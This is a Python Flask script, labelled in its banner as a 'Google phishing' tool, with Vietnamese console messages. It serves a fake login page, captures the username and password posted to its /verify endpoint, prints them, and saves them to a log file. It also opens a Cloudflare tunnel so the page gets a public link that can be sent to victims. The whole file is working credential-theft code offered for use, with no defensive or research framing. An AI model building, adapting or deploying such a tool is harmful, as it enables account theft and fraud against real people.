from flask import Flask, request, render_template_string, jsonify
import subprocess
import threading
import re
import os

app = Flask(__name__)

with open('index.html', 'r', encoding='utf-8') as f:
    HTML = f.read()

@app.route('/')
def home():
    return render_template_string(HTML)

# Đổi đường dẫn từ /login thành /verify
@app.route('/verify', methods=['POST'])
def verify():
    data = request.get_json()
    user = data.get('user', '')
    passw = data.get('pass', '')
    
    print("\n" + "="*60)
    print(f"\033[91m[+] TÀI KHOẢN: {user}\033[0m")
    print(f"\033[91m[+] MẬT KHẨU: {passw}\033[0m")
    print("="*60 + "\n")
    
    with open('log.txt', 'a', encoding='utf-8') as f:
        f.write(f"User: {user} | Pass: {passw}\n")
    
    return "OK", 200

def start_cloudflared():
    print("\n[+] Đang kết nối Cloudflared...")
    process = subprocess.Popen(
        ['cloudflared', 'tunnel', '--url', 'http://localhost:5000'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    for line in process.stdout:
        if 'trycloudflare.com' in line:
            match = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
            if match:
                url = match.group(0)
                print("\n" + "="*60)
                print(f"\033[92m[🔗] LINK CÔNG KHAI: {url}\033[0m")
                print("="*60 + "\n")
                break

if __name__ == '__main__':
    print("\n" + "="*60)
    print("  ROBLOX_EGOR V2 - GOOGLE PHISHING")
    print("="*60)
    threading.Thread(target=start_cloudflared, daemon=True).start()
    print("\n[*] Server tại: http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
